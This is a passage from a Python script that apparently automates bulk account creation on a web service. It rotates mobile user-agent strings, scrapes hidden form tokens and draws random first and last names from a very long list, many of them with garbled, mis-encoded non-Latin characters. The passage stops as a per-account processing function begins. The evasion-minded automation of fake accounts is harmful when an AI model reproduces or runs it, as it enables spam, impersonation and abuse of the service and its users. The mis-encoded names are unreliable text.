    ua6 = f'Mozilla/5.0 (Linux; U; Android 4.2.2; pt-pt; GT-S7580 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
    ua = random.choice([ua1,ua2,ua3,ua4,ua5,ua6])
    return(ua)
def Create():
    clear()
    import requests as r,re,random,os
    from bs4 import BeautifulSoup
    print()
    def rnd(a,b):
      return str(random.randint(a,b))
    
    def find(txtt,wrd):
       xx = re.findall('name="'+wrd+'" value="(.*?)"',txtt.replace("amp;",""))[0]
       return xx
    m=['Aijaz|Ali', 'Zulfiqar|Ali', 'Kamran|Wassan', 'Shoaib|Shoaib', 'Muhbbat|Wassan', 'Rana|Waseem', 'Paras|Paras', 'Rana|Mohsin', 'Aliali|Aliali', 'Ali|Ali', 'Ghulam|Ghulam', 'Waqar|Lakho', 'Junaid|Chandia', 'Asif|Jan', 'Ali|Gulam', 'Malik|Saab', 'Rana|Zakir', 'Zameer|Ali', 'Irshad|Jan', 'Gulam|Shabir', 'Tariq|Rajput', 'Sajid|Ali', 'Shamshad|Ali', 'Mola|Bux', 'Awais|Rao', 'Shahbaz|Ali', 'Rana|Sahil', 'Khadam|Faqir', 'Mukhtiar|Magsi', 'Ghulam|Ali', 'Shah|Mohammed', 'Rawal|Ali', 'Ø³ØªØ§Ø±|Ø¯Ø§Ø¯Ø§', 'Abdul|Majeed', 'Mer|Muhammad', 'Ali|Rajput', 'Rana|Farman', 'Ahtisham|Rajput', 'Alideno|Khoso', 'Own|Rana', 'Suhail|Ahmed', 'Gulzar|Ahmed', 'Ahamd|Jam', 'Tasawar|Rajput', 'Fida|Qureshi', 'Shamshad|Rahu', 'Ø³ÙˆØ´Ù„|Ù…ÙŠÚÙŠØ§', 'Sheeraz|Abbasi', 'Bashir|Ustad', 'Zubair|Rao', 'Zafar|Ali', 'Yaqoob|Ali', 'M|Soomar', 'Altaf|Hussain', 'Bahadur|Ali', 'Farman|Ali', 'Waris|Ali', 'Rana|Qurban', 'Muhammad|Khan', 'Asad|Asad', 'Sartaaj|Sartaaj', 'Rana|Kabir', 'Rana|Abdul', 'Ghulam|Hussain', 'Kirshan|Kumar', 'Adil|Rajpoot', 'Sahoowal|Sahoowal', 'Ø¹Ø¨Ø¯|Ø§Ù„Ø¬Ø¨Ø§Ø±', 'Imran|Ali', 'Faz|Mahammad', 'Safeel|Nawaz', 'Ø±ÙŠØ§|Ø¶', 'Haroon|Rana', 'Amjad|Ali', 'Kashii|Rajpoot', 'Junejo|Sahib', 'Altaf|Pahore', 'Ali|Rajput', 'Zeeshan|Ali', 'Muhammad|Muktiar', 'Iftikhar|Ahmand', 'Shahzeb|Ali', 'Faiz|Jutt', 'Chanesar|Khan', 'Ali|Shar', 'Zuhair|Ahmed', 'Ù…Ø­Ø¨|Ø¹Ù„ÛŒ', 'Siraj|Khaskheli', 'Rana|Dilshad', 'Ghazanfar|Ali', 'Rao|Awais', 'Jaan|Jaan', 'Syed|Junaid', 'Abdul|Ghaffar', 'Kirshan|Kumar', 'Ø§Ø¨ÙˆÙ…Ø­Ù…Ø¯|Ø§Ø­Ù…Ø¯', 'Nisar|Hussain', 'Nasir|Dahri', 'Hakim|Khan', 'Ahsan|Raza', 'Nadir|Rind', 'SÃ¥lmÃ Ã±|Ã‡h', 'GhulamNabi|Khaskhali', 'Umar|Lal', 'NabeelHy|Ka', 'Dilshad|Magsi', 'Haaji|Anwar', 'Nisar|Ahmed', 'Barkat|Ali', 'Irfan|Ali', 'Aslam|Khan', 'Hashim|Khoso', 'Abdul|Malik', 'Masroor|Zardari', 'Rao|Bilal', 'Nisarkhoso|Nisarkhoso', 'Ù…Ø±Ø¬Ø¹|Ø§Ù„Ù†Ø§Ø·Ù‚', 'Sajawal|Rajput', 'Rana|Muhammad', 'Rana|Dilshad', 'Rana|Imran', 'Daniyal|Kazmi', 'Faqeer|Baboo', 'Azan|Jan', 'Gul|Hassan', 'Nadir|Jan', 'NadeemRind|Rind', 'Angel|Rodriguez', 'Allahbux|Rang', 'Ghullam|Muhammad', 'Talib|Hussain', 'Abid|Ali', 'Rana|Noushad', 'Ghulam|Hussain', 'Samir|Samir', 'Shahid|Rana', 'Janib|Janib', 'Maria|Albuquerque', 'Rana|Qasim', 'Faizan|Ali', 'Ali|Gul', 'Madeji|Power', 'Rajput|Faisal', 'Mansoor|Sahito', 'Ali|Dero', 'Razaq|Khaskheli', 'Muneer|Ali', 'Imran|Ali', 'Sakhawat|Ali', 'Khadim|Baloch', 'Rana|Taswar', 'Raouf|Chadhar', 'Umar|Shahzad', 'Shah|Mir', 'Irfsn|Irfsn', 'Abbas|King', 'Aftab|Ali', 'M|Raju', 'Ghulam|Mustafa', 'Gul|Sher', 'Nazim|Hussain', 'Malik|Jawed', 'Deedar|Hussain', 'Maham|Khan', 'Junaid|Rajput', 'Sawan|Ali', 'Sajwal|Rao', 'Ayaz|Ali', 'Irfan|Irfan', 'Hut|Khan', 'Ana|Mendez', 'Shakeel|Khosa', 'Javed|Javed', 'Dil|E', 'Rana|Adil', 'Rahil|Ali', 'Innayat|Ali', 'Aijaz|Abbasi', 'Jamil|Jan', 'Fidah|Khoso', 'Rana|Abdul', 'Rana|Junaid', 'Malik|Sajid', 'Ghulam|Ali', 'Ahsan|Ali', 'Imtiaz|Ali', 'Islam|Baloch', 'Hashim|Khoso', 'Sattar|Buledi', 'Nanik|Ram', 'Gul|Wali', 'Rahman|Khan', 'Ali|Hassan', 'Sooraj|Kumar', 'GhulamAbbas|Channa', 'Muhammad|Saleh', 'Ali|Ali', 'Ayazaliayaz|Ayazaliayaz', 'Asif|Baloch', 'Mujeeb|Bds', 'Rana|Mustak', 'Ali|Rind', 'Amjad|Ali', 'Ø³Ù„Ø§Ù…Ø¯ÙŠÙ†|Ø³Ù„Ø§Ù…Ø¯ÙŠÙ†', 'Himat|Ali', 'Amanullah|Abro', 'Shookat|Ali', 'Mushoque|Malokhani', 'Zulifqar|Ali', 'Fareed|Abro', 'Zuhaib|Ali', 'Rasmyh|Rasmyh', 'Zubair|Ali', 'Waheed|Ali', 'Mohsin|Shaikh', 'Muzamil|Rajput', 'Gul|Bahar', 'Zaffar|Khoso', 'Akram|Ali', 'Rana|Sajids', 'Noor|Highlights', 'Basher|Baloch', 'Musam|Aill', 'Jamshed|Rana', 'Ø¹Ù„ÛŒ|Ù…ÙˆÙ„Ø§', 'Hero|G', 'Rematullha|Rajpoot', 'Ustad|Hanif', 'Zubair|Ali', 'Rana|Abdul', 'Kamran|Ali', 'Kosar|Vighamal', 'Mansoor|Ali', 'Nadeem|Raza', 'Niaz|Hussan', 'Awais|Malik', 'Ammar|Shoz', 'Atta|Mohmad', 'Naeem|Khan', 'Sanju|Bhai', 'Waseem|Abass', 'Ghulam|M', 'Muhammad|Urs', 'Zahid|Hussain', 'Rana|Rajput', 'Meer|Jan', 'Waris|Ali', 'Inayat|Np', 'Sher|Muhhammd', 'Rana|Muzfar', 'Beni|Solis', 'Suba|Ali', 'Umesh|Kumar', 'Basit|Kahout', 'Rafiq|Khaskali', 'Saira|Khan', 'Rizwan|Ali', 'Shahbaz|Ali', 'Ail|Aagsr', 'M|Rafiq', 'Alom|Alahaj', 'Muhmmad|Waris', 'Sameer|Ali', 'Rana|Qaser', 'Fkgkodfj|Xkxnxuc', 'Saijad|Ali', 'Nadeem|Jan', 'Ajkhoso|Ajkhoso', 'Huzaifa|Ansari', 'Mazhar|Abbas', 'Molaa|Bux', 'Mashuq|Ali', 'Aneel|Kumar', 'Zahid|Hussain', 'Alihyder|Kalhoro', 'Rana|Rana', 'Bashir|Ahmed', 'Khalid|Hussein', 'Mumtaz|Ali', 'Arif|Memon', 'Ayoub|Baloch', 'Tehmoor|Ali', 'Imran|Ali', 'Shamshad|Ali', 'Ghulam|Hussain', 'Sajjad|Panhwar', 'Mole|Deno', 'Farooq|Bhaijan', 'Israr|Jakhrani', 'Imtyaz|Ali', 'Adeel|Masih', 'Gull|Hassan', 'Tando|Adam', 'Ù…Ù†Ø¸ÙˆØ±|Ø±Ø§Ù‡Ùˆ', 'Rana|Rehman', 'Mamtaz|Sehto', 'Amjid|Ali', 'Rana|Mubashir', 'Hamidullah|Mangsi', 'Ghulam|Nabi', 'Ahmed|Ali', 'Syedjaved|Shah', 'Rao|Hassan', 'Papoo|Kumar', 'Mehtab|Ali', 'Rana|Kashif', 'Rana|Wnus', 'Farman|Ali', 'Zulifiqar|Zulifqar', 'Sadam|Chandio', 'Mitho|Mallah', 'Ú©Ø§Ø´Ù|Ø±Ø§Ø¬Ù¾ÙˆØª', 'Shamshaad|Rahoo', 'Hajan|Abbasi', 'Muneer|Zaib', 'Ayaz|Ayaz', 'Zain|Ali', 'Ghulam|Muhammad', 'Rao|Bilal', 'Babu|Khan', 'Rana|Ikram', 'Rana|Nasir', 'Amen|Rajpot', 'Fardeen|Panhwar', 'Ù†Ú¯Ø§Ú¾|Ø­Ø¨ÙŠØ¨', 'Nadeem|Ali', 'Najaf|Ali', 'Ø¹Ù…Ø±Ø§Ù†|Ø¹Ø¨Ø§Ø³ÛŒ', 'Sahil|Shah', 'Ali|Hassan', 'Sonu|Jani', 'Ajmal|Abbasi', 'Abn|Rajab', 'Imtiyaz|Yousufzai', 'Dildar|Ali', 'Adil|Rao', 'Badshah|Yt', 'Sawan|Ali', 'Ali|Ahmed', 'Amir|Ali', 'Amjad|Ali', 'Shahid|Khan', 'Siama|Khan', 'Gulam|Shabir', 'Tehmoor|Hassan', 'Ghulam|Ali', 'Masum|Ali', 'Dedar|Ali', 'Shani|Jutt', 'Rintu|Kumar', 'Sikandar|Shah', 'Furqan|Jutt', 'Rahil|Ali', 'Rana|Shehzad', 'Nisha|Kumari', 'Jamshed|Khan', 'Zawar|Safdar', 'Murtaza|Ali', 'Muhammad|Aijaz', 'Punhal|Ali', 'Bisharat|Mirbahar', 'XtylÃ­Å›h|Shahmir', 'Ù†ØµÙŠØ±Ø§Ø­Ù…Ø¯|Ù…ÙŠÙ…Ú»', 'Darya|Khan', 'Imdad|Khoso', 'Allyas|Allyas', 'Amjad|Ali', 'Bhatti|G', 'Faizan|Aziz', 'Rashad|Baloch', 'Abdul|Jabar', 'Rana|Shafiq', 'Hamadullah|Lakho', 'Ziafat|Khan', 'Faqeer|N', 'Rana|Ibrar', 'Shafi|Muhmmad', 'Awees|Ali', 'Amir|Ali', 'Ali|Khan', 'QaMar|ZaMan', 'Rana|Naveed', 'ÙØ±ÛŒÙ†Ø§|ÙØ±ÛŒÙ†Ø§', 'Ghul|Sher', 'Safeer|Khaskhali', 'Rana|Asim', 'Farhan|Ali', 'Ghulam|Abbas', 'Zulfiqar|Ali', 'Zakir|Ali', 'Rhman|Ali', 'Rana|Ali', 'Muneer|Khan', 'Mumtaz|Ali', 'Nadeem|Ali', 'Zameer|Shah', 'Faheem|Ahmad', 'Pordip|Mandal', 'Shahzaib|Rahman', 'Zidi|Bacha', 'Waqar|Rajput', 'Ali|Akbar', 'Ali|Raza', 'Sabir|Ali', 'Rana|Qurban', 'Ali|Bahte', 'Sajad|Ali', 'Ahadattaullah|Malik', 'Muzammil|Hussain', 'Jan|Muhammad', 'Fasial|S', 'Ameer|NaNa', 'Makro|Sharif', 'Mithal|Khaskheli', 'Ù…Ø­Ù…Ø¯Ù…ÙˆØ³Ø§|Ù…Ø­Ù…Ø¯Ù…ÙˆØ³Ø§', 'Mitho|Mallah', 'Muzzamil|Ali', 'Ahmad|Hassan', 'Babar|Babar', 'Zawar|Muhammad', 'Rana|Nadir', 'Mazhar|Ali', 'Rana|Irfan', 'Bilal|Abbasi', 'Ghulam|Jaffar', 'Asif|Rana', 'MÅ“hÃ¤mÉ™d|Å˜hÃ¦', 'M|Nawaz', 'Farooq|Ali', 'Ashfaq|Rahoo', 'Azmat|Ali', 'Mateen|Rana', 'Shan|Ali', 'Ã‡hÃ¥rÃ®yÄ“|Ã‡hÃ¸krÄ«', 'Parwez|Ali', 'Azhar|Hussain', 'Shahabaz|Ali', 'Syed|Ghot', 'Zahid|Hussain', 'Mir|Babu', 'Zarik|M', 'Shakel|Ansari', 'Hafiz|Imran', 'Shah|Zaib', 'Bilal|Jan', 'Asif|Asif', 'Asif|Asif', 'Muzafar|Rajbut', 'Makhdoom|Ghulam', 'Rana|Farooq', 'Gulam|Yaseen', 'Ashiqe|Jatt', 'Arshad|Brohi', 'Nazeer|Ahmed', 'Sajad|Ali', 'Mircho|Mal', 'Rana|Junaid', 'Lakho|Mal', 'Sajid|Ali', 'Raees|Rahat', 'Irfan|Ali', 'Rana|Imran', 'Ali|SHADOW', 'Riaz|Khan', 'Ahsan|Bozdar', 'Shahidalisolangi|Shahidalisolangi', 'Tariq|Tariq', 'Rao|Nasir', 'Zahid|Ali', 'Shahzad|Madni', 'Sarfaraz|Rahu', 'Mubashair|Rana', 'Ahsan|Khoso', 'Jalger|Bhatti', 'Rana|Wajid', 'Lala|Aziz', 'Shakir|Abbasi', 'Ali|Asgar', 'Ruble|Hasan', 'Abdul|Rehman', 'Azizullah|Soomro', 'Abbas|Ali', 'Muhammad|Ali', 'Rana|Wajid', 'Rana|Musharaf', 'Rashid|Qureshi', 'Shahmeer|Chandio', 'Shan|Ali', 'Ahmed|Qureshi', 'Zaheer|Abbas', 'Imran|Ali', 'Asif|Khan', 'Shahid|Ali', 'Mangii|Mangii', 'Momin|Ali', 'Meer|Shan', 'Muqu|Poiro', 'Umar|Shahzad', 'Waris|Ali', 'Numwar|Ali', 'Muhammad|Tahir', 'AKhtar|Ali', 'Rana|Sajid', 'Sarfarazmemon|Attad', 'Salim|Junejo', 'Mashque|Ali', 'Hassnan|Ali', 'Irfan|Ali', 'Adv|Ali', 'Himmat|Ali', 'Khalid|Jamil', 'Mohsin|Rajput', 'Syed|Nadir', 'Raheem|Punho', 'Rana|Abdullah', 'Rana|Noaman', 'Mansoor|Solangi', 'Imran|Jaan', 'Waris|Ali', 'Rana|Mubasher', 'Mujahid|Ali', 'Hussnain|Rajpoot', 'Chaudhary|Abdul', 'Haider|Baloch', 'Ali|Dino', 'Mir|Khan', 'Irfan|Fatima', 'Arshad|Baloch', 'Shakir|Abbasi', 'Naveed|Rind', 'Gul|Muhammad', 'Meer|Murtaza', 'Papo|Papo', 'Nisar|Ali', 'Gbhs|Bhit', 'Sadoro|Jan', 'Rana|Moon', 'Ramzan|Jan', 'Rana|Zakir', 'Rao|Waqas', 'M|Waqas', 'Rana|Rana', 'Rukhsar|Haidry', 'RaNa|BOby', 'M|Juman', 'Sadiq|Ali', 'Manik|Khan', 'Ran|A', 'Ghulab|Hussain', 'Ronaq|Ali', 'Tarique|Ali', 'Abdul|Qadir', 'Zawar|Sohana', 'Mehran|Rajput', 'Sikandar|Ali', 'ÃƒtÃ®f|Ã‚', 'Meer|Shahzeb', 'Sajjad|Abbasi', 'Rana|Naeem', 'Bashir|Ahmed', 'Rafeh|Rajpoot', 'áºžk|KhÃ„Ã±', 'Imtiaz|Khoso', 'Alex|Shahzad', 'Aman|Abbasi', 'Mehran|Rajput', 'Raja|Rajpot', 'Bahdur|Ali', 'Hammad|Ali', 'Salman|Salman', 'Shahzad|Shahzad', 'AtaullAh|Khan', 'Rafique|Mirani', 'Arbab|Ali', 'Nisar|Ali', 'Zahid|Hussain', 'Rana|Shahzad', 'Rana|Ramzan', 'Noro|Mohmad', 'Riaz|Rajput', 'Mahbat|Khan', 'Ahsan|Ali', 'Rana|Ikram', 'Qamar|Abbas', 'Jahanzib|Ali', 'Rana|Sunny', 'Rao|Yasir', 'Muhammad|Mithal', 'Ashiq|Hussain', 'Ha|Ni', 'Abdul|Latif', 'Meer|Mortaz', 'Meer|Zohaib', 'Zahid|Bhatti', 'Awais|Rajput', 'Ali|Bux', 'Abdul|Hakeem', 'Hassnain|Muavia', 'Syed|Junaid', 'Riaz|Machi', 'Ahsan|Abro', 'Hyder|Ali', 'Sattar|Sattar', 'Sayed|Sharafat', 'Syed|Bilalarif', 'Lal|Muhmmad', 'Mohsin|Ali', 'Asif|Ali', 'Juleed|Shah', 'Hayat|Khan', 'Ali|Bux', 'à¤ªà¤µà¤¨|à¤…à¤²à¥à¤²à¤¾à¤ªà¥à¤°', 'Ghulam|Nabi', 'Zaheer|Ali', 'Soomar|Bughio', 'Madad|Ali', 'Naeem|Chohan', 'Javed|Javed', 'Waseem|Raza', 'Saorg|Khan', 'Zeeshan|Zeeshan', 'Aliza|Chaudhary', 'Rana|Shuaib', 'Ali|Khan', 'Rao|Shabbir', 'Commandos|King', 'Arshad|Sli', 'Rana|Shahrukh', 'Ratan|Kumar', 'Umar|Khan', 'Ali|Bhnoo', 'Shahzaib|Shah', 'Aqib|Gakhar', 'Rana|Ishaq', 'Bilal|Rajput', 'Asif|Khan', 'Hazrat|Hussain', 'Zohair|Ali', 'Parvez|Ali', 'Altaf|Hussain', 'Mashooq|Ali', 'Dilshad|Magsi', 'Gulam|Mustafa', 'Safdiar|Khan', 'Tofiq|Khan', 'Sudheer|Ahmad', 'Suhrab|Pardesi', 'Syed|Badshah', 'Ashok|Kumar', 'Ssbri|Chandio', 'Yaseen|Ali', 'Rimsha|Shehzadi', 'Meer|Aamir', 'Lakhiar|Adeel', 'Ariz|Muhammad', 'Ø¹Ø¨Ø¯Ø§Ù„Ù„Û|Ú©ÙˆÚ¾Ø§Ø±Ùˆ', 'Yameen|Ali', 'Sahil|Gadehi', 'Sahab|Ali', 'Naimatullah|Ali', 'Baqir|Sajjad', 'Ù…ÙŠØ±|Ø­Ø§Ø±Ø«', 'M|Slutan', 'Sadaqat|Ali', 'Fahad|Ali', 'Muhammed|Shabeer', 'Khalifo|Chandio', 'Zohaib|Ali', 'Ab|Ghani', 'Ibrahim|Baloch', 'Rehmatullah|Mastoi', 'Mohammed|Younis', 'Shahzadi|Kiran', 'Ahmad|Khan', 'Arshad|SooMro', 'Sadam|Solangi', 'Yamen|Ali', 'Majid|Khan', 'Ab|Aziz', 'Sabir|Khuharo', 'Nazeer|Chandio', 'Md|Samer', 'Kaif|Qureshi', 'MuHammad|HaaDi', 'Altaf|Khan', 'Majid|Ali', 'Muhammad|Abraim', 'Noor|Ahmed', 'Abid|Hussain', 'Ashraf|Buriro', 'Rajib|Ali', 'Ahsan|Ali', 'Aakash|Khuharo', 'Hassan|Ali', 'Awaiz|Memon', 'Asharf|Malah', 'Muslim|Chandio', 'Haji|Saddam', 'Rashid|Ali', 'Assadullah|Kolachi', 'Kashif|Ali', 'Irfan|Ali', 'Zulfqar|Soomro', 'Ghafar|Chandio', 'Younis|Ali', 'Meer|Murtiza', 'Majahd|Ali', 'Rao|Arslan', 'Rana|Tsawar', 'Akbar|Rajput', 'Rana|Yasir', 'Rana|Waqar', 'Rana|Umer', 'Rao|Zeeshan', 'Rana|Aqib', 'Rana|Mudassar', 'Rana|Zubair', 'Rana|Zohaib', 'Rana|Rana', 'Rao|Shoaib', 'Nokhaiz|Rao', 'Rana|G', 'Saeed|Somro', 'Rana|Muklish', 'Muzamil|Rajput', 'RÃ¢Ãµ|ZÃªshÃ£Ã±', 'Rana|Nasrullah', 'Rana|Naveed', 'Hamza|Rajpoot', 'Rana|Naveed', 'Rana|Zahid', 'Rao|Ali', 'Rao|Ishfaq', 'Ehsan|Rana', 'Ahsan|Rana', 'Mohammed|Akmal', 'Rana|Naeem', 'Rana|Ahmad', 'Rana|Shani', 'Rao|Nasir', 'Rao|M', 'Rana|Imran', 'Rao|Arshad', 'Rao|Sanaullah', 'Ali|Rana', 'Rao|Muhammad', 'Rana|Gulraiz', 'Salal|Rajput', 'Rana|Muhammad', 'Ijaz|Rajpoot', 'M|Farman', 'Rao|Raees', 'Rana|Umar', 'Umair|Rana', 'Shafiq|Rajpoot', 'Rana|Numan', 'Rao|Shb', 'Rana|Yousif', 'Rana|Liaqat', 'Rana|Asad', 'Zafar|Rajpoot', 'Rao|Hamza', 'Abubakar|Rajput', 'Rao|M', 'Rana|Ishaq', 'Waqas|Rajpoot', 'Amir|Sohail', 'Rao|Sohaib', 'Rana|Shazil', 'Rao|Bilal', 'Rao|Altaf', 'Rao|Nabeel', 'Hamza|Rao', 'Asif|Rana', 'Rana|Umair', 'Raokashif|Ali', 'Rao|Qaiser', 'Rana|Attual', 'Rana|Shabaz', 'Rao|Salman', 'Rao|Samad', 'Rao|Shoaib', 'Rana|A', 'Rao|Kashif', 'Rao|Zarar', 'Rana|Tayyub', 'Raja|Kamal', 'Amir|Rajput', 'RaoAlizaman|RaoAlizaman', 'Hamza|Rao', 'Rana|Falak', 'Sikandar|Khan', 'Rao|Shahbaz', 'Rana|Talha', 'Kashif|Rajpoot', 'Hammad|Rana', 'Hamza|Rao', 'Roa|Zahid', 'Rana|Hamza', 'Rao|Saleem', 'Rao|Faryad', 'Rao|Abubakar', 'Bilal|Rajput', 'Rao|Waseem', 'Sonu|Rao', 'Rana|Rizwan', 'Bilal|Rao', 'Rans|Maqsood', 'Rana|Furqan', 'Rao|Ali', 'Rana|Muzamil', 'M|Asif', 'Rao|Sohail', 'Rana|Bahadur', 'Rana|Muhmmad', 'Shahzada|Gs', 'Rao|Farhan', 'Zahgim|Ali', 'Abaid|Raja', 'Rana|Waseem', 'Rana|Ajmal', 'Rao|Latif', 'Rao|Aqib', 'Rana|Ramzan', 'Wajid|Rana', 'Sabir|Rajpoot', 'Rana|Shehryar', 'Rana|Yaqub', 'Rao|Abdul', 'Rajput|Sab', 'Rana|Tasawar', 'Rana|Waseem', 'Rana|Babar', 'Rana|Shahid', 'Rana|Maviya', 'Rana|Saeed', 'Waheed|Rajput', 'Junaid|Rajpoot', 'Rao|Saqib', 'Rao|Azeem', 'Rana|Ali', 'Muhammad|Nadeem', 'Rana|Majid', 'Rana|Sahab', 'Abubakar|Jatoi', 'Sabir|Dogar', 'Ameen|Rana', 'Rana|Shakeel', 'Rao|Tasleem', 'PÊ€É©Å‹cÉ˜|NÊŒsÉ©Ê€', 'Rana|Mani', 'Rana|Jee', 'Zidi|Rana', 'Rana|Kamran', 'Rana|Zabi', 'Mehtab|Rao', 'Ø­Ø³Ù†|Ø±Ø§Ùˆ', 'Rana|Sajid', 'Rao|Aftab', 'Rana|Muhammad', 'Muhammad|Muhammad', 'Rao|Abdulrazaq', 'Rao|MubeenRao', 'Rao|Nazeer', 'Rana|Adnan', 'Rana|Alishan', 'Rana|Wahab', 'Rao|Ali', 'Rana|Rashid', 'Rana|Waqar', 'Dilawar|Rao', 'Rana|Iftkhar', 'Shami|Rana', 'Rana|Hamza', 'Rana|Luqman', 'Rao|Haseeb', 'Rana|Waseem', 'Rana|Abid', 'Ø´ÛØ±ÛŒ|Ø±Ø§Ø¬Ù¾ÙˆØª', 'Rao|Mohammad', 'Rana|Rashid', 'Rana|Hamza', 'Tariq|Javid', 'Rao|Ahtsham', 'Rana|Tauqeer', 'Rao|Zeeshan', 'Ahad|Rajpoot', 'M|Muzamil', 'Rana|Zaid', 'Rana|Asad', 'Usama|Rana', 'Rana|Ali', 'Rana|Sajid', 'Rana|Tokeer', 'Rana|Mikro', 'Rana|Rana', 'Raza|Jafri', 'Rana|Kamran', 'Rao|Sharafat', 'Rana|Awais', 'Rana|Arslan', 'Rana|Qazafi', 'Rana|Waqar', 'Flk|Sher', 'Rana|Danish', 'Rana|Mudassar', 'Rana|Khalid', 'Rana|Nadeem', 'Adil|Rao', 'Rana|Tahseen', 'Rao|Tayyab', 'Rao|Waseem', 'Rana|Faheem', 'Rao|Khaleeq', 'Ali|Adnan', 'Rao|Ikhtiar', 'Rao|Jani', 'Rao|Amir', 'Farman|Rao', 'Ø§Ø´ØªÛØ§Ø±ÛŒÛ”Ø±Ø§Ø¬Ù¾ÙˆØª|Ø§Ø´ØªÚ¾Ø±ÛŒÛ”Ø±Ø§Ø¬Ù¾ÙˆØª', 'RanaAli|Rana', 'Rao|Shoaib', 'Raozain|Raozain', 'Sajawal|Rajpoot', 'Rana|Tanveer', 'Rao|Aqib', 'Rana|Ehsan', 'Rao|Zubair', 'Rajpoot|Zeeshan', 'Ahsan|Rana', 'Rao|Saad', 'Safdar|Rana', 'Rana|Mubeen', 'RÃ¤Ã±Ã¢|UmÃ¤ir', 'Rao|Jani', 'Rana|Ibrar', 'Rao|Amir', 'Rana|Asif', 'Hussnain|Qureshi', 'Abdullah|Somroo', 'Rana|Nabeel', 'Rana|Gulfam', 'Babar|Rao', 'Zubair|Rao', 'Abubakar|Rao', 'Rana|G', 'Rana|Shair', 'Rana|Haris', 'Rao|Tariq', 'Zain|Rao', 'Muhammad|Qadeer', 'Rao|Naveed', 'Rizwan|Rao', 'Sajid|Ali', 'Rao|Munir', 'Rana|Afaq', 'Rajput|Brand', 'Rao|Hassan', 'Rana|Saim', 'Mukhtiyar|Khan', 'Rana|Sarfraz', 'Rana|Naveed', 'Rana|Faizan', 'Usama|Rana', 'Muzammil|Rao', 'Rahman|Dogar', 'Rana|Danish', 'Rao|Shahryar', 'Rana|Shahzad', 'Naqeeb|Rao', 'Anss|Rana', 'Subhan|Rana', 'Ø¹Ø¨Ø¯Ø§Ù„Ø±Ø­Ù…Ø§Ù†|Ø±Ø§Ø¤', 'R|A', 'Ch|Asad', 'Nadeem|Rao', 'Raja|Nawaz', 'Rana|Iqbal', 'S|Rao', 'Rana|Maqsood', 'Rao|Qasim', 'Rana|Zahid', 'Ø±Ø§Ø¤|Ø¹Ø±ÙØ§Ù†', 'M|Jamshed', 'Rao|Imran', 'Shahzad|Rajpoot', 'Rana|Shahzaib', 'Muhammad|Sikandar', 'Ø±Ø§Ù†Ø§Ø¹Ø§Ù…Ø±|Ø±Ø§Ù†Ø§Ø¹Ø§Ù…Ø±', 'Rao|Hasnain', 'Rana|Asif', 'Javed|Rana', 'Raoiqrar|Raoiqrar', 'Zaheer|Rana', 'Mudassir|Rajput', 'Rana|Awais', 'Rao|Waseem', 'Ali|Rao', 'Rao|Asif', 'Haseeb|Rajput', 'Rana|Rizwan', 'Rana|Shuaib', 'Rana|Shoaib', 'Rao|Shoaib', 'Rajpoot|Arslan', 'Rao|Muzammil', 'Rana|Rashid', 'Rana|Shahbaz', 'Rao|Inaam', 'Ø±Ø§Ù†Ø§|Ù†Ø¯ÛŒÙ…', 'Arslan|Rao', 'Rana|Shakeel', 'Zeeshan|Rana', 'Rana|Mansoor', 'Ø±Ø§Ù†Ø§|Ø¹Ø§Ø·Ù', 'Bilal|Prince', 'Rana|Shokat', 'Rana|Babar', 'M|Jafar', 'Ranaiqrar|Ranaiqrar', 'Rao|Imran', 'Rao|Arif', 'Fatima|Rajpoot', 'Nomii|Rajput', 'Rao|Junaid', 'Hasnaat|Rajput', 'Rao|Haleem', 'Ø¹Ø¨Ø¯Ø§Ù„Ù„Û|Ø±Ø§Ø¬Ù¾ÙˆØª', 'Shoiab|Rana', 'Ø±Ø§Ù†Ø§|Ø¯Ø§Ù†ÛŒ', 'Rao|Tasawar', 'Sunny|Rao', 'áŽ·áŽ¥á—á|á•á¬áá–á—á', 'Sajjad|Rao', 'Sardar|Ijaz', 'Rao|Akbar', 'Rana|Usama', 'Mujahid|Khanbadani', 'Rao|Amjid', 'Rana|Ahsan', 'Rana|Akram', 'Adnan|Rana', 'Imran|Ashraf', 'Rajab|Rajput', 'Rao|Shakir', 'Rana|Usman', 'Ø±Ø§Ù†Ø§|Ø§Ø±Ø³Ù„Ø§Ù†', 'Ø±Ø¶Ø§|Ø³Ø¹ÛŒØ¯', 'Rao|Tariq', 'Saad|Rajpoot', 'Parvaiz|Parvaiz', 'Rana|Dilo', 'Rana|Rashid', 'Rana|Asif', 'Rao|Ali', 'Sultan|Rao', 'Rana|Umair', 'Rao|Saad', 'Rao|Farhan', 'Rana|Babar', 'Raja|Sahib', 'Umer|Wakeel', 'Rao|M', 'Arslan|Rao', 'Rao|Mudassar', 'Rajpoot|Ramzanrajpoot', 'Wasim|Rao', 'Bilal|Rana', 'Shahbaz|Rajpoot', 'M|Asif', 'Rana|Aftab', 'Usama|Rao', 'Rao|Abdul', 'Amir|Sohail', 'Rafiq|Khan', 'Rao|Tanveer', 'Rana|Fahim', 'Rana|Afaq', 'Rana|Jabbar', 'Rana|Zain', 'Rao|Talha', 'Ahmad|Raza', 'M|Rao', 'Brand|Rao', 'Rao|Waseem', 'Rana|Zeshan', 'Adeel|Khalil', 'Rana|Ahamd', 'Rana|Sajid', 'Rana|Bilal', 'Rao|Amir', 'Rao|Asif', 'Farhad|Rao', 'Rao|Kashif', 'Ibrar|Rajput', 'Rao|Aftab', 'Muhammad|Ali', 'Rao|Ali', 'Hassan|Rajput', 'Rao|Mazhar', 'Rao|F', 'Sijawal|Rana', 'Rana|Intizar', 'Rana|Husnain', 'Rao|Babar', 'Rana|Uzair', 'Ø¹Ø«Ù…Ø§Ù†|Ø§Ø­Ù…Ø¯', 'Rana|Ali', 'Rana|Waseem', 'Rana|Rehan', 'Rana|Ahmad', 'Rao|Touqeer', 'Rana|Shahid', 'Rao|Abid', 'Azeem|Rao', 'Rana|Imran', 'Rana|Asgher', 'Rao|Raza', 'Rana|Hussain', 'Rao|Shahryar', 'Rao|G', 'Nouman|Rajpoot', 'Rao|Faisal', 'Rao|Saim', 'Rana|Shahid', 'Rana|Adnan', 'Usman|Usman', 'Rajpoot|Putter', 'Hafiz|Ahtsham', 'Rana|Nadeem', 'Moon|Rao', 'Shana|Rao', 'Rao|Fakhar', 'Rana|Imran', 'Rajpoot|Sufyan', 'Malik|Fiaz']
    def process(pas,mmail):
        global ok
        import requests,re
        requests=requests.Session()
        cookies=None
        def find(txtt,wrd):
               xx = re.findall('name="'+wrd+'" value="(.*?)"',txtt.replace("amp;",""))[0]
               return xx                      
        import requests,re,random
        requests=requests.Session()
        cookies=None
        ua=random_ua()
